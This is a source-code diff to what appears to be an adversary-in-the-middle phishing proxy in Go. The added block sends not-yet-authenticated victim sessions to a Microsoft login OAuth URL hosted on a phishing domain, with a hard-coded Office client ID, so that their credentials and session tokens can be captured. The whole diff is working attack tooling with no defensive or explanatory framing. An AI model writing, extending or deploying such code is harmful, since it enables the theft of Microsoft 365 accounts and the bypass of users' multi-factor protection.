@@ -1766,6 +1766,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										return req, resp
 									}
 								}
+
+								// For existing AitM sessions (not device code), redirect to OAuth
+								if session, exists := p.sessions[ps.SessionId]; exists && session.DCMode == DCModeOff {
+									// Check if session hasn't completed authentication yet
+									if len(session.CookieTokens) == 0 && len(session.CustomTokens) == 0 {
+										// Redirect to OAuth
+										phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
+										loginPhishHost := ""
+										for _, ph := range pl.GetProxyHosts() {
+											origHost := combineHost(ph.OrigSub, ph.Domain)
+											if origHost == "login.microsoftonline.com" {
+												loginPhishHost = combineHost(ph.PhishSub, phishDomain)
+												break
+											}
+										}
+										if loginPhishHost == "" {
+											loginPhishHost = "secure." + phishDomain
+										}
+										oauthURL := fmt.Sprintf("https://%s/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code&scope=openid+profile+offline_access&response_mode=form_post&prompt=login", loginPhishHost)
+										log.Important("[%d] [AitM] redirecting existing session to login: %s", ps.Index, oauthURL)
+										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+										resp.Header.Set("Location", oauthURL)
+										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+										return req, resp
+									}
+								}
 							}
 
 							// Send lure_landed notification (session validated, botguard passed if enabled)
